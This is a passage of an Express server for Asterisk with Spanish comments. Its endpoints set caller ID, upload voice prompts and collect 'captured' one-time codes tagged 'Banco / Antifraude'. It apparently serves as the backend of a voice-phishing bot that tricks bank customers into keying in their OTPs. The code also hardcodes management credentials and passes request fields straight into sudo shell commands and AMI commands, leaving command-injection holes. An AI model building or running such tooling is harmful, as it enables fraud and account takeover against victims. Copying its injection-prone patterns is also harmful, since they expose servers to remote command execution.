        console.log(`[AstDB SUCCESS] Extension ${cleanExt} CallerID actualizado en Asterisk DB: "${cleanName}" <${cleanNum}>`);
      }
    });

    sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
      putNumCmd,
      putNameCmd,
    ]).catch(() => {});

    res.json({
      success: true,
      message: `CallerID de la extensión ${cleanExt} actualizado a "${cleanName}" <${cleanNum}> en Asterisk AstDB.`,
      extension: cleanExt,
      callerIdNum: cleanNum,
      callerIdName: cleanName,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ==========================================
// ENDPOINTS PARA GESTIÓN DE AUDIOS PREGRABADOS
// ==========================================

const SOUNDS_CUSTOM_DIR = '/var/lib/asterisk/sounds/custom';

// List available audio files on server
app.get('/api/asterisk/audio/list', (req, res) => {
  try {
    if (!fs.existsSync(SOUNDS_CUSTOM_DIR)) {
      try {
        fs.mkdirSync(SOUNDS_CUSTOM_DIR, { recursive: true });
      } catch (e) {}
    }

    if (fs.existsSync(SOUNDS_CUSTOM_DIR)) {
      const files = fs.readdirSync(SOUNDS_CUSTOM_DIR);
      const audioFiles = files
        .filter((f) => f.endsWith('.wav') || f.endsWith('.gsm') || f.endsWith('.mp3'))
        .map((f) => {
          const stats = fs.statSync(path.join(SOUNDS_CUSTOM_DIR, f));
          const baseName = f.replace(/\.[^/.]+$/, '');
          return {
            fileName: f,
            asteriskPath: `custom/${baseName}`,
            sizeBytes: stats.size,
            sizeKb: (stats.size / 1024).toFixed(1) + ' KB',
            modifiedAt: stats.mtime.toISOString(),
          };
        });
      return res.json({ success: true, files: audioFiles, directory: SOUNDS_CUSTOM_DIR });
    }

    res.json({ success: true, files: [], directory: SOUNDS_CUSTOM_DIR });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Upload and convert audio file to Asterisk format (WAV 8000Hz PCM 16-bit Mono)
app.post('/api/asterisk/audio/upload', express.json({ limit: '50mb' }), async (req, res) => {
  try {
    const { name, fileName, category, dataUrl } = req.body;

    if (!dataUrl) {
      return res.status(400).json({ success: false, error: 'No se envió contenido de audio (dataUrl requerido)' });
    }

    // Clean base name for Asterisk
    const rawName = (fileName || name || 'audio_' + Date.now())
      .toLowerCase()
      .replace(/\.[^/.]+$/, '')
      .replace(/[^a-z0-9_]/g, '_')
      .replace(/_+/g, '_');

    const cleanBaseName = rawName.slice(0, 40) || `prompt_${Date.now()}`;
    const targetWavName = `${cleanBaseName}.wav`;
    const targetPath = path.join(SOUNDS_CUSTOM_DIR, targetWavName);

    // Extract base64 payload
    const matches = dataUrl.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
    const buffer = matches && matches[2]
      ? Buffer.from(matches[2], 'base64')
      : Buffer.from(dataUrl, 'base64');

    // Ensure custom sounds directory exists
    try {
      if (!fs.existsSync(SOUNDS_CUSTOM_DIR)) {
        fs.mkdirSync(SOUNDS_CUSTOM_DIR, { recursive: true });
      }
    } catch (e) {
      exec(`sudo mkdir -p ${SOUNDS_CUSTOM_DIR} && sudo chmod 777 ${SOUNDS_CUSTOM_DIR}`, () => {});
    }

    // Save temporary raw file
    const tempRawPath = `/tmp/raw_${cleanBaseName}_${Date.now()}`;
    fs.writeFileSync(tempRawPath, buffer);

    // Convert to Asterisk native PCM 8000Hz 16-bit Mono using ffmpeg or sox
    const ffmpegCmd = `ffmpeg -y -i "${tempRawPath}" -ar 8000 -ac 1 -c:a pcm_s16le "${targetPath}"`;
    const soxCmd = `sox "${tempRawPath}" -r 8000 -c 1 -b 16 "${targetPath}"`;

    exec(ffmpegCmd, (ffmpegErr) => {
      if (!ffmpegErr) {
        try { fs.unlinkSync(tempRawPath); } catch (e) {}
        console.log(`[AUDIO OK - ffmpeg] Convertido a ${targetPath}`);
        return res.json({
          success: true,
          asteriskPath: `custom/${cleanBaseName}`,
          fileName: targetWavName,
          format: 'WAV 8000Hz PCM 16-bit Mono',
          message: `Audio guardado y optimizado para Asterisk en custom/${cleanBaseName}`,
        });
      }

      // Try with Sox if ffmpeg failed
      exec(soxCmd, (soxErr) => {
        if (!soxErr) {
          try { fs.unlinkSync(tempRawPath); } catch (e) {}
          console.log(`[AUDIO OK - sox] Convertido a ${targetPath}`);
          return res.json({
            success: true,
            asteriskPath: `custom/${cleanBaseName}`,
            fileName: targetWavName,
            format: 'WAV 8000Hz PCM 16-bit Mono',
            message: `Audio guardado y optimizado con sox en custom/${cleanBaseName}`,
          });
        }

        // Fallback: direct write of the buffer
        try {
          fs.writeFileSync(targetPath, buffer);
          try { fs.unlinkSync(tempRawPath); } catch (e) {}
          return res.json({
            success: true,
            asteriskPath: `custom/${cleanBaseName}`,
            fileName: targetWavName,
            format: 'Direct Write (WAV)',
            message: `Audio guardado en custom/${cleanBaseName}`,
          });
        } catch (directErr: any) {
          // If permission issue, try sudo cp
          exec(`sudo cp "${tempRawPath}" "${targetPath}" && sudo chmod 644 "${targetPath}"`, (sudoErr) => {
            try { fs.unlinkSync(tempRawPath); } catch (e) {}
            if (sudoErr) {
              return res.status(500).json({ success: false, error: sudoErr.message });
            }
            res.json({
              success: true,
              asteriskPath: `custom/${cleanBaseName}`,
              fileName: targetWavName,
              message: `Audio guardado via sudo en custom/${cleanBaseName}`,
            });
          });
        }
      });
    });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Delete an audio file
app.post('/api/asterisk/audio/delete', (req, res) => {
  try {
    const { asteriskPath, fileName } = req.body;
    const base = (fileName || asteriskPath?.replace('custom/', ''))?.replace(/\.[^/.]+$/, '');
    if (!base) {
      return res.status(400).json({ success: false, error: 'Nombre de archivo requerido' });
    }

    const filePath = path.join(SOUNDS_CUSTOM_DIR, `${base}.wav`);
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      return res.json({ success: true, message: `Archivo ${base}.wav eliminado` });
    }
    exec(`sudo rm -f "${SOUNDS_CUSTOM_DIR}/${base}.wav"`, () => {});
    res.json({ success: true, message: `Orden de eliminación enviada para ${base}.wav` });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// In-memory buffer for captured OTPs in production
interface CapturedOtpItem {
  id: string;
  number: string;
  otp: string;
  timestamp: string;
  channel?: string;
  service?: string;
  status: 'valid' | 'invalid' | 'pending';
}

let capturedOtpHistory: CapturedOtpItem[] = [];

// Endpoint to receive OTP captures from Asterisk curl or AMI
app.post('/api/asterisk/otp/capture', (req, res) => {
  const { number, otp, channel, service = 'Banco / Antifraude' } = req.body;
  if (otp) {
    const cleanNumber = (number && number !== '<unknown>') ? String(number) : 'Destino Directo';
    const record: CapturedOtpItem = {
      id: 'otp-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
      number: cleanNumber,
      otp: String(otp),
      timestamp: new Date().toLocaleTimeString(),
      channel: channel || 'PJSIP',
      service: service || 'Banco / Antifraude',
      status: 'valid',
    };
    capturedOtpHistory.unshift(record);
    if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
    console.log(`[PRODUCCIÓN] ⭐ ¡NUEVO CÓDIGO OTP CAPTURADO!: [${otp}] - Tel: ${cleanNumber}`);
  }
  res.json({ success: true, count: capturedOtpHistory.length });
});

// Endpoint to list all captured OTP records
app.get('/api/asterisk/otp/records', (req, res) => {
  res.json({ success: true, records: capturedOtpHistory });
});

// Endpoint to delete/clear captured records
app.delete('/api/asterisk/otp/records', (req, res) => {
  capturedOtpHistory = [];
  res.json({ success: true });
});

// Endpoint to inspect live channels on Asterisk
app.get('/api/asterisk/live/channels', async (req, res) => {
  try {
    const amiOutput = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
      'core show channels concise',
    ]);
    res.json({ success: true, raw: amiOutput });
  } catch (err: any) {
    res.json({ success: false, raw: '', error: err.message });
  }
});

// Endpoint to hangup an active call
app.post('/api/asterisk/call/hangup', async (req, res) => {
  const { channel } = req.body;
  try {
    const cmd = channel ? `channel request hangup ${channel}` : 'channel request hangup all';
    await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [cmd]);
    res.json({ success: true, message: `Canal ${channel || 'todos'} colgado` });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ==========================================
// VITE MIDDLEWARE (DEV) & STATIC FALLBACK (PROD)
// ==========================================

async function startServer() {
  if (process.env.NODE_ENV !== 'production' && !fs.existsSync(path.join(process.cwd(), 'dist', 'index.html'))) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    // Cache static assets (JS, CSS, images, audio, webfonts) for 1 year immutable
    app.use('/assets', express.static(path.join(distPath, 'assets'), {
      maxAge: '1y',
      immutable: true,
      etag: true,
    }));

    // Cache generic static public files
    app.use(express.static(distPath, {
      maxAge: '1h',
      etag: true,
    }));

    // SPA fallback: index.html should revalidate so updates are immediate
    app.get('*', (req, res) => {
      res.setHeader('Cache-Control', 'no-cache, must-revalidate');
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Asterisk 20 Governor Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
